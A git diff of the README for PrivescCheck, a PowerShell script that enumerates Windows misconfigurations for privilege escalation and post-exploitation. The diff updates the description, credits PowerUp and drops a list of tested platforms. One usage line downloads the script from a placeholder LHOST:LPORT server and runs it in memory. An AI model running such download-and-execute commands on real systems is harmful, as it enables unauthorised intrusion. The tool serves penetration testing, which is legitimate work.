@@ -1,6 +1,10 @@
 # PrivescCheck
 
-This script aims to __enumerate common Windows security misconfigurations__ that can be leveraged for privilege escalation. It's still under development. I plan on adding more features in the future. Feedback is appreciated so ping me [@itm4n](https://twitter.com/itm4n).
+This script aims to __enumerate common Windows security misconfigurations__ which can be leveraged for privilege escalation and __gather various information__ which might be useful for __exploitation__ and/or __post-exploitation__.
+
+I built on the amazing work done by [@harmj0y](https://twitter.com/harmj0y) and [@mattifestation](https://twitter.com/mattifestation) in [PowerUp](https://github.com/HarmJ0y/PowerUp). I added more checks and also tried to reduce the amount of false positives.
+
+It's still a Work-in-Progress because there are a few more checks I want to implement but it's already quite complete. If you have any suggestion (improvements, features), feel free to contact me on Twitter [@itm4n](https://twitter.com/itm4n).
 
 
 ## Usage 
@@ -25,18 +29,6 @@ Import the script from a web server.
 ```
 C:\Temp\>powershell "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/Invoke-PrivescCheck.ps1'; Invoke-PrivescCheck" 
 ```
-
-## Tests
-
-I test my script on various platforms:
-
-- Windows 10 64-bits  
-- Windows 10 Insider Preview 64-bits  
-- Windows Server 2012 R2 64-bits   
-- Windows 7 64-bits   
-- Windows 7 32-bits   
-
-Nevertheless, there may still be some bugs that trigger on some specific configurations. 
 
 
 ## Yet another Windows Privilege escalation tool, why?
